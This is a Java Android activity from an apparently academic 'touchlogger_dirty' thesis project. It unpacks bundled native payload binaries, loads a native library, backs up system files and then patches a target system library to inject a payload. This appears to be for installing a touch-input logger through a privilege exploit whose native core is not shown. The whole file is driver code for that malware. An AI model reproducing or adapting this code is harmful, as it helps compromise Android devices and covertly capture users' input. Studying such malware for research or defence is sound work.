package org.leyfer.thesis.touchlogger_dirty.activity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import org.leyfer.thesis.touchlogger_dirty.R;
import org.leyfer.thesis.touchlogger_dirty.activation.PayloadActivator;
import org.leyfer.thesis.touchlogger_dirty.handler.InjectProgressHandler;
import org.leyfer.thesis.touchlogger_dirty.utils.Config;
import org.leyfer.thesis.touchlogger_dirty.utils.JNIAPI;

import java.io.File;

import static org.leyfer.thesis.touchlogger_dirty.utils.FileUtils.unpackAsset;

public class MainActivity extends Activity {

    public static final String TAG = "TouchLoggeer-dirty";

    private Handler mHandler;

    private static final String EXTRA_STARTED_BY_PAYLOAD = "org.leyfer.thesis.extra.started_by_payload";

    @SuppressLint("UnsafeDynamicallyLoadedCode")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (unpackAssets()) {
            PayloadActivator.getInstance().setLocalPath(
                    MainActivity.this.getFilesDir().getAbsolutePath());
            System.load(new File(this.getFilesDir(), Config.MAIN_LIBRARY_NAME).getAbsolutePath());
        } else {
            Log.e(TAG, "Unable to unpack assets!");
            return;
        }

        setContentView(R.layout.activity_main);

        TextView tv = (TextView) findViewById(R.id.sample_text);

        Bundle extras = this.getIntent().getExtras();
        boolean startedByPayload = false;
        if (extras != null) {
            startedByPayload = extras.getBoolean(EXTRA_STARTED_BY_PAYLOAD, false);
            if (startedByPayload) {
                tv.setText(R.string.started_by_payload);
            } else {
                tv.setText(JNIAPI.stringFromJNI());
            }
        } else {
            tv.setText(JNIAPI.stringFromJNI());
        }

        mHandler = new InjectProgressHandler(this);

        if (!startedByPayload) {
            Button button = (Button) findViewById(R.id.button);
            button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            if (!PayloadActivator.getInstance().backupTargets()) {
                                Log.e(TAG, "Unable to create backup of system files!");
                                mHandler.sendEmptyMessage(
                                        InjectProgressHandler.MSG_INJECT_DEPENDENCY_FAIL);
                                return;
                            }

                            if (PayloadActivator.getInstance().patchTargetLibrary()) {
                                Log.d(TAG, "Patching target library finished!");
                                mHandler.sendEmptyMessage(
                                        InjectProgressHandler.MSG_INJECT_DEPENDENCY_SUCCESS);
                            } else {
                                Log.e(TAG, "Unable to patch system libraries!");
                                mHandler.sendEmptyMessage(
                                        InjectProgressHandler.MSG_INJECT_DEPENDENCY_FAIL);
                            }
                        }
                    }).start();
                }
            });
        }
    }

    private boolean unpackAssets() {
        String abi;
        if (android.os.Build.VERSION.SDK_INT
                >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            abi = Build.SUPPORTED_ABIS[0];
        } else {
            abi = Build.CPU_ABI;
        }

        File dirtyCopyPath = unpackAsset(MainActivity.this,
                String.format("%s/%s", abi, Config.MAIN_LIBRARY_NAME),
                Config.MAIN_LIBRARY_NAME);

        File sharedPayloadPath = unpackAsset(MainActivity.this,
                String.format("%s/%s", abi, Config.SHARED_PAYLOAD_NAME),
                Config.SHARED_PAYLOAD_NAME);

        File execPayloadPath = unpackAsset(MainActivity.this,
                String.format("%s/%s", abi, Config.EXEC_PAYLOAD_NAME),
                Config.EXEC_PAYLOAD_NAME);

        return sharedPayloadPath != null
                && sharedPayloadPath.exists()
                && execPayloadPath != null
                && execPayloadPath.exists()
                && dirtyCopyPath != null
                && dirtyCopyPath.exists();
    }
}
